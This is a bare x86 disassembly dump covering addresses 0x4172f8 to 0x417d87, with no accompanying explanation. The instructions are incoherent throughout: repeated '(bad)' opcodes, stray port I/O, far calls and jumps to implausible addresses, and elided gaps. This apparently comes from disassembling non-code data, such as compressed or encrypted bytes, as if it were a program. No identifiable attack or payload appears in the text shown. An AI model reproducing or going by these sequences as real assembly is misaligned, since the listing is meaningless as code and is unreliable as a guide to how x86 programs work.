  4172f8:	sbb    BYTE PTR [edx],bh
  4172fa:	add    edx,DWORD PTR [ecx+0x775843a3]
  417300:	cmp    eax,DWORD PTR [ecx+0x3a9f8dd4]
  417306:	inc    edi
  417307:	ror    BYTE PTR [esi-0x7036143b],1
  41730d:	jae    0x417308
  41730f:	data16 xor al,0xdd
  417312:	imul   eax,DWORD PTR [edx-0x7962ecd5],0x9a199a91
  41731c:	xchg   edx,eax
  41731d:	in     eax,0x32
  41731f:	adc    al,al
  417321:	cdq    
  417322:	ret    0xc574
  417325:	loop   0x4172fd
  417327:	mov    dl,0xd5
  417329:	inc    ebx
  41732a:	and    WORD PTR [eax-0x48],bx
  41732e:	mov    edx,0x70608e77
  417333:	mov    dl,0xc2
  417335:	mov    ebp,0xc05be820
  41733a:	iret   
  41733b:	pop    es
  41733c:	sub    eax,0x8896cd19
  417341:	inc    esi
	...
  4173b2:	add    BYTE PTR [eax],al
  4173b4:	repz inc ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0xf5
  4173c1:	mov    WORD PTR cs:[esi],ss
  4173c4:	xchg   edx,eax
  4173c5:	std    
  4173c6:	add    BYTE PTR [eax],al
  4173c8:	test   BYTE PTR [eax],0x0
  4173cb:	add    BYTE PTR [ebp-0x6d],ah
  4173ce:	retf   0xfd78
  4173d1:	dec    edx
  4173d2:	int3   
  4173d3:	xor    eax,0xbddcd194
  4173d8:	in     eax,dx
  4173d9:	loope  0x4173bf
  4173db:	repnz test al,0xc1
  4173de:	push   ebp
  4173df:	ror    DWORD PTR [edx],1
  4173e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173e2:	test   eax,0xa6d07bf4
  4173e7:	nop
  4173e8:	shl    DWORD PTR [esi],0x8a
  4173eb:	lods   al,BYTE PTR ds:[esi]
  4173ec:	or     dl,BYTE PTR [ebp-0x7d]
  4173ef:	sbb    al,0x9c
  4173f1:	mov    al,0x90
  4173f3:	imul   ebx,DWORD PTR [esi+0x24],0x68
  4173f7:	ret    
  4173f8:	add    BYTE PTR [edi-0x14954198],ah
  4173fe:	cmp    BYTE PTR ds:0xd367bfda,al
  417404:	je     0x417407
  417406:	(bad)  
  417407:	cmp    BYTE PTR [ebp-0x15],bh
  41740a:	jae    0x41742f
  41740c:	xor    edi,edi
  41740e:	inc    edi
  41740f:	lods   eax,DWORD PTR ds:[esi]
  417410:	(bad)  
  417411:	fisubr WORD PTR [edi-0x14f6b4df]
  417417:	cdq    
  417418:	add    BYTE PTR [esi-0x6a],cl
  41741b:	mov    ah,0x33
  41741d:	sub    al,0x29
  41741f:	jmp    0xf55e39bf
  417424:	mov    edi,0x316e6e73
  417429:	retf   0xcef4
  41742c:	scas   al,BYTE PTR es:[edi]
  41742d:	clc    
  41742e:	sbb    DWORD PTR ds:0x787eced7,esp
  417434:	mov    esi,0x8c7e6279
  417439:	mov    cl,0x8f
  41743b:	xchg   edx,eax
  41743c:	sahf   
  41743d:	icebp  
  41743e:	jne    0x417431
  417440:	fst    QWORD PTR ds:0x7e01d632
  417446:	loopne 0x4174b3
  417448:	sti    
  417449:	retf   
  41744a:	push   ecx
  41744b:	xor    al,0x29
  41744d:	lods   eax,DWORD PTR ds:[esi]
  41744e:	test   al,0x3a
  417450:	mov    DWORD PTR [edx-0x27],esi
  417453:	into   
  417454:	sahf   
  417455:	ja     0x4173ef
  417457:	sbb    al,0xfd
  417459:	fwait
  41745a:	aam    0x8a
  41745c:	push   edi
  41745d:	scas   al,BYTE PTR es:[edi]
  41745e:	mov    ?,ebp
  417460:	dec    edi
  417461:	loop   0x4174b7
  417463:	pop    esi
  417464:	adc    cl,dh
  417466:	leave  
  417467:	pusha  
  417468:	es mov bl,0xcd
  41746b:	add    ebp,esp
  41746d:	mov    ?,WORD PTR [eax+0x55]
  417470:	mov    BYTE PTR [edx],cl
  417472:	jb     0x41744d
  417474:	mov    bh,0x56
  417476:	pop    edx
  417477:	(bad)  
  417478:	out    0xdf,al
  41747a:	pop    ds
  41747b:	les    esp,FWORD PTR [ecx+ecx*2-0x1a]
  41747f:	push   edx
  417480:	jne    0x417487
  417482:	rcr    bl,cl
  417484:	and    eax,0x2c454271
  417489:	dec    ebp
  41748a:	cmp    esp,DWORD PTR [edi-0x4f33e07c]
  417490:	inc    esp
  417491:	sub    ebp,ecx
  417493:	jns    0x417513
  417495:	mov    fs,WORD PTR [ebp+eax*4-0x5d07fea8]
  41749c:	scas   eax,DWORD PTR es:[edi]
  41749d:	stos   BYTE PTR es:[edi],al
  41749e:	(bad)  
  41749f:	fist   DWORD PTR [ecx+0xf]
  4174a2:	jmp    0x50268c8f
  4174a7:	(bad)  
  4174a8:	mov    DWORD PTR [bp+si],ecx
  4174ab:	fmulp  st(7),st
  4174ad:	test   DWORD PTR [esi],ecx
  4174af:	inc    ebp
  4174b0:	hlt    
  4174b1:	pop    es
  4174b2:	push   edi
  4174b3:	pop    esp
  4174b4:	mov    al,ds:0x32825704
  4174b9:	push   ebp
  4174ba:	pop    eax
  4174bb:	ss jne 0x417527
  4174be:	call   0x4d5a91
	...
  417533:	add    BYTE PTR ds:0xfff32bd8,ah
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0x5ee43b7a
  417542:	push   ds
  417543:	or     BYTE PTR [eax-0x9ffff02],cl
  417549:	add    BYTE PTR [eax],al
  41754b:	add    BYTE PTR [ebx+0x55],al
  41754e:	inc    esp
  41754f:	bound  ebx,QWORD PTR [ebx-0x1]
  417552:	pushf  
  417553:	stos   BYTE PTR es:[edi],al
  417554:	xlat   BYTE PTR ds:[ebx]
  417555:	scas   al,BYTE PTR es:[edi]
  417556:	pop    ds
  417557:	stc    
  417558:	into   
  417559:	(bad)  
  41755a:	jmp    0x4175ad
  41755c:	call   0x58a96f1b
  417561:	sbb    cl,BYTE PTR [edi-0x79]
  417564:	aad    0x0
  417566:	sbb    eax,0x3ba30b98
  41756b:	xchg   edx,eax
  41756c:	shl    DWORD PTR [ebp-0xdd262e9],0xc7
  417573:	adc    BYTE PTR ds:0xf0d2bcc7,0x99
  41757a:	adc    cl,BYTE PTR [ecx+0x44]
  41757d:	fwait
  41757e:	je     0x4175a7
  417580:	jp     0x41753d
  417582:	out    0xdb,eax
  417584:	imul   ecx,esp,0x190c62f8
  41758a:	mov    esi,0xf9a0af59
  41758f:	clc    
  417590:	fwait
  417591:	pop    ds
  417592:	loopne 0x417584
  417594:	adc    eax,0x77664ff4
  417599:	xor    ecx,DWORD PTR [ebp-0x33]
  41759c:	xchg   esp,eax
  41759d:	add    al,0xa7
  41759f:	daa    
  4175a0:	xchg   ecx,eax
  4175a1:	jl     0x417594
  4175a3:	sbb    ch,BYTE PTR [ecx-0x7]
  4175a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175a7:	add    bh,ah
  4175a9:	jb     0x417622
  4175ab:	mov    bl,0x4f
  4175ad:	lods   eax,DWORD PTR ds:[esi]
  4175ae:	mov    edi,0xa3283b4a
  4175b3:	(bad)  
  4175b5:	jmp    0xb9d727c9
  4175ba:	push   esi
  4175bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175bc:	adc    eax,0x9ea113a2
  4175c1:	icebp  
  4175c2:	ins    BYTE PTR es:[edi],dx
  4175c3:	jns    0x41761b
  4175c5:	in     eax,dx
  4175c6:	mov    eax,ds:0x975bac99
  4175cb:	or     BYTE PTR [edx+esi*1-0x42d21aac],dh
  4175d2:	xor    eax,0xeb1c56ac
  4175d7:	sub    al,0x4c
  4175d9:	test   eax,edi
  4175db:	dec    esi
  4175dc:	fs jmp 0xa95a04bc
  4175e2:	or     BYTE PTR [eax],bl
  4175e4:	xchg   ebx,eax
  4175e5:	dec    edi
  4175e6:	push   cs
  4175e7:	stos   DWORD PTR es:[edi],eax
  4175e8:	stos   DWORD PTR es:[edi],eax
  4175e9:	or     BYTE PTR [ebp-0x76],0xe5
  4175ed:	pop    ss
  4175ee:	test   eax,ebx
  4175f0:	cdq    
  4175f1:	add    esi,DWORD PTR [esi]
  4175f3:	push   cs
  4175f4:	out    dx,eax
  4175f5:	sbb    DWORD PTR [esi+0x5d],0x7
  4175f9:	fisubr DWORD PTR [edx]
  4175fb:	jmp    ebx
  4175fd:	je     0x417678
  4175ff:	pop    ebx
  417600:	aas    
  417601:	sahf   
  417602:	pop    esi
  417603:	lock inc ebx
  417605:	mov    ch,0xcf
  417607:	adc    DWORD PTR [ebx-0x59],0xe47db61b
  41760e:	lods   al,BYTE PTR ds:[esi]
  41760f:	xor    DWORD PTR [edi+0x1d],edi
  417612:	int    0x89
  417614:	mov    ebx,0x9c1765dc
  417619:	dec    esp
  41761a:	mov    esp,0x2ef9c697
  41761f:	retf   0xf4ee
  417622:	mov    ebp,0x3d20e90
  417627:	cmp    al,0xd0
  417629:	std    
  41762a:	pop    esi
  41762b:	jb     0x4175fd
  41762d:	mov    dh,BYTE PTR [ebp-0x7d2e7540]
  417633:	cmp    eax,0xf9a96110
  417638:	mov    cl,0x0
  41763a:	pop    ebx
  41763b:	dec    eax
  41763c:	inc    edx
  41763d:	xchg   edx,eax
  41763e:	mov    ss,WORD PTR [eax]
  417640:	add    DWORD PTR [ebx+0x0],ebp
	...
  4176b2:	add    BYTE PTR [eax],al
  4176b4:	(bad)  
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	test   BYTE PTR [edx],ah
  4176c2:	push   ebp
  4176c3:	cwde   
  4176c4:	jle    0x4176c5
  4176c6:	add    BYTE PTR [eax],al
  4176c8:	test   BYTE PTR [eax],0x0
  4176cb:	add    BYTE PTR [ebp+0x12fdedda],bh
  4176d1:	popf   
  4176d2:	(bad)  
  4176d4:	dec    eax
  4176d5:	or     al,0x1d
  4176d7:	aaa    
  4176d8:	js     0x41765b
  4176da:	ins    BYTE PTR es:[edi],dx
  4176db:	(bad)  
  4176dc:	in     eax,0xdd
  4176de:	pop    ss
  4176df:	cmc    
  4176e0:	pop    ebp
  4176e1:	pop    ds
  4176e2:	jo     0x417671
  4176e4:	sahf   
  4176e5:	inc    ecx
  4176e6:	es xchg ebp,eax
  4176e8:	stos   BYTE PTR es:[edi],al
  4176e9:	not    bh
  4176eb:	inc    edx
  4176ec:	pop    ebp
  4176ed:	adc    DWORD PTR [esi],edx
  4176ef:	jo     0x417760
  4176f1:	pop    edi
  4176f2:	mov    ?,esi
  4176f4:	mov    ds:0xb27660c7,al
  4176f9:	stos   BYTE PTR es:[edi],al
  4176fa:	(bad)  
  4176fb:	inc    ecx
  4176fc:	or     BYTE PTR [ecx+0x1a4130c4],dl
  417702:	jecxz  0x41777c
  417704:	outs   dx,DWORD PTR ds:[esi]
  417705:	icebp  
  417706:	test   eax,0xee365818
  41770b:	adc    al,0x54
  41770d:	mov    al,0x30
  41770f:	cmc    
  417710:	inc    esp
  417711:	or     ah,dh
  417713:	pop    eax
  417714:	dec    eax
  417715:	int3   
  417716:	mov    ds:0x855b61ad,eax
  41771b:	jg     0x417758
  41771d:	das    
  41771e:	ss test eax,0x2ade9c0c
  417724:	dec    ecx
  417725:	xlat   BYTE PTR ds:[ebx]
  417726:	(bad)  
  417727:	in     al,0x54
  417729:	in     eax,0x2c
  41772b:	mov    edx,0x38bd00cd
  417730:	into   
  417731:	(bad)  
  417732:	ss xchg ebx,eax
  417734:	cmp    esp,ecx
  417736:	xchg   ebp,eax
  417737:	push   es
  417738:	int3   
  417739:	outs   dx,DWORD PTR ds:[esi]
  41773a:	std    
  41773b:	xchg   edx,eax
  41773c:	nop
  41773d:	inc    ecx
  41773e:	pop    ss
  41773f:	fisttp WORD PTR [ecx-0x50]
  417742:	imul   DWORD PTR ds:0xbe6aca08
  417748:	fcmovu st,st(5)
  41774a:	xor    al,0xbd
  41774c:	dec    eax
  41774d:	mov    esp,DWORD PTR [edx-0x6cb16974]
  417753:	sbb    bl,bl
  417755:	mov    dh,0x88
  417757:	push   DWORD PTR [ecx+0x80c160e]
  41775d:	inc    ebp
  41775e:	int    0xfc
  417760:	sbb    DWORD PTR [eax-0x78b0dd22],ebp
  417766:	jae    0x4177ce
  417768:	xlat   BYTE PTR ds:[ebx]
  417769:	inc    edx
  41776a:	ror    ebp,cl
  41776c:	test   al,0x73
  41776e:	arpl   bx,ax
  417770:	xchg   edx,eax
  417771:	not    DWORD PTR [ebp+edi*1+0x2e]
  417775:	xchg   ecx,eax
  417776:	ds int 0xdf
  417779:	mov    eax,0x8f797064
  41777e:	scas   eax,DWORD PTR es:[edi]
  41777f:	test   eax,0xe66ca42f
  417784:	sub    edx,DWORD PTR [ebp+0x1f]
  417787:	add    eax,DWORD PTR [eax-0x7d4c1140]
  41778d:	jg     0x41777b
  41778f:	and    DWORD PTR [edi-0x65],edx
  417792:	cld    
  417793:	push   0xb632e92d
  417798:	pop    esp
  417799:	cmp    eax,0x5bfcd83f
  41779e:	cwde   
  41779f:	push   ebx
  4177a0:	js     0x417727
  4177a2:	or     dh,cl
  4177a4:	and    BYTE PTR [ebx-0x25],ch
  4177a7:	adc    dl,bl
  4177a9:	hlt    
  4177aa:	sub    eax,DWORD PTR [edi+0x64]
  4177ad:	jmp    FWORD PTR [ebx+esi*1]
  4177b0:	gs dec edx
  4177b2:	jmp    0x4177f6
  4177b4:	add    al,0xa4
  4177b6:	sbb    cl,0x21
  4177b9:	jp     0x4177dc
  4177bb:	mov    ?,esp
  4177bd:	cs stos BYTE PTR es:[edi],al
  4177bf:	inc    esi
  4177c0:	push   ds
  4177c1:	inc    ebp
	...
  417832:	add    BYTE PTR [eax],al
  417834:	shr    DWORD PTR [edi-0x4810cfa],1
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0x77d6e99
  417841:	cdq    
  417842:	mov    ah,0x32
  417844:	je     0x417846
  417846:	add    DWORD PTR [eax],eax
  417848:	test   BYTE PTR [eax],0x0
  41784b:	add    BYTE PTR [esi+0xe],ch
  41784e:	and    ecx,0x4dbd1991
  417854:	dec    ebx
  417855:	jp     0x4177dd
  417857:	mov    ecx,0x815c0808
  41785c:	nop
  41785d:	int    0x3f
  41785f:	xor    eax,0xfec4dfd6
  417864:	or     ebx,ebx
  417866:	xor    al,0x1a
  417868:	xchg   BYTE PTR [esi+0x2],ah
  41786b:	jecxz  0x4178d1
  41786d:	imul   edx,DWORD PTR [esp+ebp*2],0xfffffff8
  417871:	adc    bh,BYTE PTR [ebx-0x470145e]
  417877:	fnstcw WORD PTR [edx+0x29]
  41787a:	sub    esi,edi
  41787c:	adc    eax,0x317085c3
  417881:	xchg   edx,eax
  417882:	les    esi,FWORD PTR [ebx+eiz*4]
  417885:	ficomp DWORD PTR [ecx]
  417887:	mov    bh,0xe8
  417889:	inc    edx
  41788a:	js     0x41780f
  41788c:	(bad)  [ecx+eax*1+0x28]
  417890:	push   esp
  417891:	adc    al,0x47
  417893:	jecxz  0x417887
  417895:	sub    eax,0xbaad9018
  41789a:	test   eax,0x1019f269
  41789f:	in     eax,0x82
  4178a1:	push   esp
  4178a2:	sbb    ecx,DWORD PTR [esi+eiz*1-0x1e94d9bc]
  4178a9:	das    
  4178aa:	cdq    
  4178ab:	outs   dx,BYTE PTR ds:[esi]
  4178ac:	sbb    esp,esi
  4178ae:	fldcw  WORD PTR [esi-0x43]
  4178b1:	add    edi,edi
  4178b3:	(bad)  
  4178b4:	into   
  4178b5:	push   es
  4178b6:	fiadd  WORD PTR [esi]
  4178b8:	scas   al,BYTE PTR es:[edi]
  4178b9:	pop    esi
  4178ba:	or     cl,BYTE PTR [eax+0x23a025dc]
  4178c0:	push   ss
  4178c1:	inc    ecx
  4178c2:	mov    dl,0x7c
  4178c4:	je     0x41793e
  4178c6:	int    0xea
  4178c8:	mov    ebx,0xef4de711
  4178cd:	frstor [ecx+edi*1]
  4178d0:	pop    ds
  4178d1:	stos   BYTE PTR es:[edi],al
  4178d2:	pop    ebp
  4178d3:	retf   0x7e2d
  4178d6:	int    0xb3
  4178d8:	cwde   
  4178d9:	and    BYTE PTR [esi],0x8
  4178dc:	mov    eax,ds:0xde376972
  4178e1:	cmp    BYTE PTR [ecx-0x53e80508],al
  4178e7:	mov    ds:0x8b1fd6f9,al
  4178ec:	mov    ecx,0x936b84d1
  4178f1:	add    al,0xc2
  4178f3:	xor    al,0x66
  4178f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178f6:	jge    0x4178fb
  4178f8:	xchg   esi,eax
  4178f9:	aas    
  4178fa:	test   DWORD PTR [ebp-0x6],0x461df271
  417901:	out    0x4a,eax
  417903:	lea    edi,[ebx+0x22168d9d]
  417909:	mov    ah,0x70
  41790b:	call   0x588e:0x2468b311
  417912:	sub    eax,DWORD PTR [ebp+0x53d3fadc]
  417918:	stos   DWORD PTR es:[edi],eax
  417919:	test   DWORD PTR [edx-0x47],edi
  41791c:	xchg   edi,eax
  41791d:	or     bl,dl
  41791f:	dec    ecx
  417920:	mov    cl,0x6d
  417922:	push   ebp
  417923:	pop    es
  417924:	dec    edx
  417925:	and    dl,BYTE PTR [eax+0x36]
  417928:	mov    al,ds:0xa53d32e1
  41792d:	stos   BYTE PTR es:[edi],al
  41792e:	push   esp
  41792f:	out    dx,al
  417930:	pop    ecx
  417931:	sub    DWORD PTR [ebx],esi
  417933:	xchg   BYTE PTR [ebx],bh
  417935:	sub    al,0xf8
  417937:	jno    0x4178c5
  417939:	push   esp
  41793a:	inc    ecx
  41793b:	jb     0x4179a9
  41793d:	inc    ecx
  41793e:	jl     0x41792d
  417940:	pusha  
  417941:	add    BYTE PTR fs:[eax],al
	...
  4179b4:	retf   
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi-0x6ff3680]
  4179c2:	or     eax,0x1016a01
  4179c7:	add    dh,dh
  4179c9:	add    BYTE PTR [eax],al
  4179cb:	add    bh,ah
  4179cd:	jmp    0x4179a9
  4179cf:	out    dx,eax
  4179d0:	dec    edx
  4179d1:	imul   ebx,DWORD PTR [eax+0x399aa164],0xffffff80
  4179d8:	es pop es
  4179da:	ja     0x417975
  4179dc:	imul   esp,DWORD PTR ds:[edx-0x37],0x21
  4179e1:	cdq    
  4179e2:	stos   BYTE PTR es:[edi],al
  4179e3:	inc    esi
  4179e4:	pop    eax
  4179e5:	mov    bh,0xfc
  4179e7:	sub    esp,DWORD PTR [ebp-0x1c]
  4179ea:	data16 (bad) 
  4179ec:	and    BYTE PTR [ecx+ebx*2-0x1],ah
  4179f0:	not    BYTE PTR [edx]
  4179f2:	dec    esi
  4179f3:	mov    ds:0x929c56cf,eax
  4179f8:	xchg   esp,eax
  4179f9:	in     al,0x8c
  4179fb:	mov    ch,0xce
  4179fd:	jbe    0x41799f
  4179ff:	xor    esi,esi
  417a01:	in     al,dx
  417a02:	(bad)  
  417a03:	and    esp,DWORD PTR [esi+0x15]
  417a06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a07:	cmc    
  417a08:	pop    edx
  417a09:	int3   
  417a0a:	pop    esp
  417a0b:	jecxz  0x4179cb
  417a0d:	mov    edi,0xb558aad5
  417a12:	pop    ebx
  417a13:	pop    ecx
  417a14:	mov    al,0x78
  417a16:	add    eax,DWORD PTR [edi+edx*2]
  417a19:	jo     0x417a06
  417a1b:	out    dx,eax
  417a1c:	pop    esi
  417a1d:	cmp    ecx,DWORD PTR [ebx]
  417a1f:	or     eax,0x27a7038e
  417a24:	xchg   ebp,eax
  417a25:	push   ds
  417a26:	aaa    
  417a27:	scas   al,BYTE PTR es:[edi]
  417a28:	mov    al,ds:0x4e5dd03f
  417a2d:	mov    bh,dh
  417a2f:	pusha  
  417a30:	fldcw  WORD PTR [ecx+0x2c784cbf]
  417a36:	add    eax,ecx
  417a38:	or     eax,0xddf37d8b
  417a3d:	(bad)  
  417a3e:	loopne 0x4179eb
  417a40:	fidivr WORD PTR [eax+0x7e]
  417a43:	jae    0x417a25
  417a45:	call   0xf7ab:0x54266138
  417a4c:	sub    al,0x29
  417a4e:	scas   al,BYTE PTR es:[edi]
  417a4f:	hlt    
  417a50:	mov    eax,ds:0x87147f14
  417a55:	dec    ebx
  417a56:	and    ebx,DWORD PTR [esi+0x4c]
  417a59:	push   eax
  417a5a:	int3   
  417a5b:	mov    eax,0xa3a6d43a
  417a60:	popa   
  417a61:	push   ebx
  417a62:	loopne 0x417a50
  417a64:	in     al,dx
  417a65:	out    0xf2,al
  417a67:	mov    ch,0xe6
  417a69:	inc    ebx
  417a6a:	xchg   BYTE PTR [ebx-0x43],dh
  417a6d:	daa    
  417a6e:	pop    ebp
  417a6f:	fld    st(0)
  417a71:	xlat   BYTE PTR ds:[ebx]
  417a72:	test   al,0x45
  417a74:	mov    ah,0xd5
  417a76:	dec    edi
  417a77:	into   
  417a78:	ror    DWORD PTR [eax+0x4956af9d],1
  417a7e:	fistp  DWORD PTR [esi]
  417a80:	ja     0x417af3
  417a82:	ja     0x417a16
  417a84:	data16 fcmovbe st,st(2)
  417a87:	in     al,dx
  417a88:	cli    
  417a89:	or     BYTE PTR [edx],dh
  417a8b:	cdq    
  417a8c:	push   ss
  417a8d:	out    0x9e,eax
  417a8f:	rcl    BYTE PTR [edi-0x3c],1
  417a92:	out    0x81,eax
  417a94:	jb     0x417a42
  417a96:	and    ebx,DWORD PTR [ebp+0x26a180d3]
  417a9c:	imul   edi,DWORD PTR [ecx-0x34],0xe19428dc
  417aa3:	push   ebx
  417aa4:	aas    
  417aa5:	ja     0x417ae1
  417aa7:	sti    
  417aa8:	inc    esp
  417aa9:	cld    
  417aaa:	add    DWORD PTR [edi+eiz*8],esp
  417aad:	mov    ebp,0x4926f763
  417ab2:	add    al,0xda
  417ab4:	mov    esi,DWORD PTR [edx]
  417ab6:	sub    eax,0x13588ab6
  417abb:	mov    esi,0xbb0462de
  417ac0:	xor    al,0xde
	...
  417b32:	add    BYTE PTR [eax],al
  417b34:	jecxz  0x417b9b
  417b36:	push   cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0xb1fef5f7
  417b41:	add    DWORD PTR [edi+eax*2+0x10260],eax
  417b48:	test   BYTE PTR [eax],0x0
  417b4b:	add    BYTE PTR [eax+0x3edf3345],al
  417b51:	dec    ebx
  417b52:	jle    0x417b9a
  417b54:	jg     0x417aea
  417b56:	dec    edi
  417b57:	inc    eax
  417b58:	xor    DWORD PTR [edx-0x59],ebp
  417b5b:	out    0x8d,eax
  417b5d:	addr16 cs test eax,0x6f27073c
  417b64:	mov    ecx,0x7a69c2f3
  417b69:	dec    ebp
  417b6a:	jg     0x417b55
  417b6c:	ret    0xa4b5
  417b6f:	sti    
  417b70:	js     0x417b79
  417b72:	out    0xf6,al
  417b74:	push   eax
  417b75:	jns    0x417bcb
  417b77:	push   ebp
  417b78:	imul   esi,eax,0xac3661a5
  417b7e:	pop    eax
  417b7f:	popf   
  417b80:	jb     0x417bd0
  417b82:	leave  
  417b83:	je     0x417bf3
  417b85:	pop    DWORD PTR [edi-0x5ab65455]
  417b8b:	mov    bh,0x6
  417b8d:	jmp    0xdd52ed21
  417b92:	dec    edx
  417b93:	add    al,0x7f
  417b95:	cmp    eax,0x18a6ae7d
  417b9a:	enter  0x5554,0x6a
  417b9e:	jns    0x417bd2
  417ba0:	lds    ebx,FWORD PTR [ecx]
  417ba2:	dec    DWORD PTR [esi+0x5ea39fe]
  417ba8:	sbb    eax,0xe19aa0be
  417bad:	jmp    0x498d:0xa4fd813c
  417bb4:	outs   dx,BYTE PTR ds:[esi]
  417bb5:	mov    ds:0xd08d70a3,eax
  417bba:	scas   eax,DWORD PTR es:[edi]
  417bbb:	add    DWORD PTR [esi+0x281b292f],ebx
  417bc1:	rol    DWORD PTR [edi],1
  417bc3:	ficomp DWORD PTR [ebx-0x7c]
  417bc6:	inc    eax
  417bc7:	(bad)  
  417bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bc9:	repz fxch st(5)
  417bcc:	xchg   edx,eax
  417bcd:	hlt    
  417bce:	popa   
  417bcf:	adc    al,0x46
  417bd1:	ja     0x417c2b
  417bd3:	pop    ecx
  417bd4:	(bad)  
  417bd5:	retf   
  417bd6:	iret   
  417bd7:	xlat   BYTE PTR ds:[ebx]
  417bd8:	std    
  417bd9:	cmc    
  417bda:	mov    eax,ds:0x1aaefd0d
  417bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417be0:	mov    ch,0x9a
  417be2:	arpl   WORD PTR [edi-0x2e],bp
  417be5:	sub    eax,0xbfa495ad
  417bea:	stc    
  417beb:	and    al,0x93
  417bed:	leave  
  417bee:	adc    ebx,DWORD PTR [ebx+0x24]
  417bf1:	scas   eax,DWORD PTR es:[edi]
  417bf2:	push   eax
  417bf3:	pop    ebp
  417bf4:	call   0x94fd:0xb4ee0d2b
  417bfb:	test   dl,cl
  417bfd:	and    esi,ebx
  417bff:	lahf   
  417c00:	clc    
  417c01:	lds    esi,FWORD PTR [ecx+eax*1]
  417c04:	test   ebx,ecx
  417c06:	dec    ecx
  417c07:	daa    
  417c08:	out    dx,eax
  417c09:	nop
  417c0a:	push   edx
  417c0b:	sub    ebp,0xffffffde
  417c0e:	mov    ah,0x84
  417c10:	aaa    
  417c11:	cmc    
  417c12:	sbb    bl,BYTE PTR [esi-0x5d0fc3d9]
  417c18:	mov    eax,0xea0abc1
  417c1d:	sbb    bl,BYTE PTR [eax]
  417c1f:	inc    esp
  417c20:	adc    esi,DWORD PTR [edi]
  417c22:	daa    
  417c23:	pop    ds
  417c24:	aas    
  417c25:	jp     0x417c79
  417c27:	mov    al,ds:0x79a4674f
  417c2c:	lock mov dl,BYTE PTR [edi+esi*1]
  417c30:	rcl    BYTE PTR [edx+0x7f1db299],cl
  417c36:	gs cs ins DWORD PTR es:[edi],dx
  417c39:	mov    al,ds:0xf1284b92
  417c3e:	push   es
  417c3f:	iret   
  417c40:	aas    
  417c41:	mov    eax,0x0
	...
  417cb2:	add    BYTE PTR [eax],al
  417cb4:	and    DWORD PTR [ebx-0x40445077],edx
  417cba:	daa    
  417cbb:	lahf   
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    esi,eax
  417cc1:	dec    ebx
  417cc2:	mov    ds:0x1035685,al
  417cc7:	add    dh,dh
  417cc9:	add    BYTE PTR [eax],al
  417ccb:	add    BYTE PTR [edx],ah
  417ccd:	dec    ebp
  417cce:	int3   
  417ccf:	cs dec esi
  417cd1:	stos   BYTE PTR es:[edi],al
  417cd2:	loop   0x417cde
  417cd4:	cmp    BYTE PTR [edi+0x3c06fbb1],bl
  417cda:	js     0x417ce0
  417cdc:	into   
  417cdd:	outs   dx,DWORD PTR ds:[esi]
  417cde:	js     0x417ca9
  417ce0:	jmp    0x58d43b59
  417ce5:	xchg   esp,eax
  417ce6:	fsubr  DWORD PTR [ecx]
  417ce8:	je     0x417cbc
  417cea:	jb     0x417d55
  417cec:	jns    0x417cc3
  417cee:	lods   eax,DWORD PTR ds:[esi]
  417cef:	mov    edi,0x8d073074
  417cf4:	into   
  417cf5:	pusha  
  417cf6:	(bad)  
  417cf7:	(bad)  
  417cf8:	(bad)  
  417cf9:	sahf   
  417cfa:	ss and al,dl
  417cfd:	pusha  
  417cfe:	aad    0xc6
  417d00:	push   edx
  417d01:	js     0x417cbb
  417d03:	mov    ds:0x2b54c883,eax
  417d08:	xlat   BYTE PTR ds:[ebx]
  417d09:	aas    
  417d0a:	jne    0x417cd2
  417d0c:	aam    0x7b
  417d0e:	test   eax,0x999fccb
  417d13:	cmp    ebx,DWORD PTR [esi+edx*1-0x37]
  417d17:	sub    BYTE PTR [edx+0x2a],dh
  417d1a:	push   esp
  417d1b:	pop    ecx
  417d1c:	popf   
  417d1d:	mov    ecx,0xa8961e99
  417d22:	jmp    0x417ceb
  417d24:	adc    bh,ch
  417d26:	cdq    
  417d27:	adc    BYTE PTR [edi],0xe6
  417d2a:	mov    edx,0x3f49b2c2
  417d2f:	cld    
  417d30:	jge    0x417d78
  417d32:	dec    ebp
  417d33:	xchg   edx,eax
  417d34:	cmp    ah,ch
  417d36:	adc    esp,ebx
  417d38:	cmp    BYTE PTR [esp+edi*2],dh
  417d3b:	aad    0x48
  417d3d:	push   es
  417d3e:	cmp    DWORD PTR [edx],0xffffffd6
  417d41:	aaa    
  417d42:	cmp    DWORD PTR [esi],0x321193da
  417d48:	mov    al,0x9c
  417d4a:	adc    al,0xe4
  417d4c:	cwde   
  417d4d:	loope  0x417dbf
  417d4f:	repnz stos DWORD PTR es:[edi],eax
  417d51:	cmp    DWORD PTR [ebx-0x4b51ff0c],ecx
  417d57:	in     al,dx
  417d58:	pop    ebx
  417d59:	imul   edi,edx,0x18407932
  417d5f:	cmp    DWORD PTR [ecx-0x51],edi
  417d62:	mov    cl,0xa9
  417d64:	call   FWORD PTR [eax+ebp*1]
  417d67:	icebp  
  417d68:	fimul  WORD PTR [edx+0x3b]
  417d6b:	test   eax,0x163a123e
  417d70:	test   al,0x68
  417d72:	sub    eax,0xca461917
  417d77:	sar    ebx,cl
  417d79:	sub    edi,ebx
  417d7b:	cld    
  417d7c:	fs xchg esi,eax
  417d7e:	ds pushf 
  417d80:	pop    edx
  417d81:	mov    bl,0x59
  417d83:	dec    edi
  417d84:	out    dx,al
  417d85:	pop    esp
  417d86:	stos   BYTE PTR es:[edi],al
  417d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
